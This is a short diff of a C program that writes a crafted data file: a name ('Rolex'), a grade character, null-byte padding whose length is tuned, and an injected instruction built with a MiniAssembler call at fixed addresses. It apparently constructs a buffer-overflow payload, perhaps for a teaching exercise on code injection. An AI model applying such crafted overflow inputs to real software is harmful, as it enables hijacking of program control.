@@ -12,9 +12,9 @@ int main(void) {
    fputs("Rolex",psFile);   
    putc('\0', psFile);
 
-   fputs("A",psFile); 
+   putc('A', psFile); 
 
-   for (i = 0; i < 14; i++)
+   for (i = 0; i < 17; i++)
       putc('\0', psFile);    
    
    adr = MiniAssembler_adr(0, 0x42005e, 0x420070);
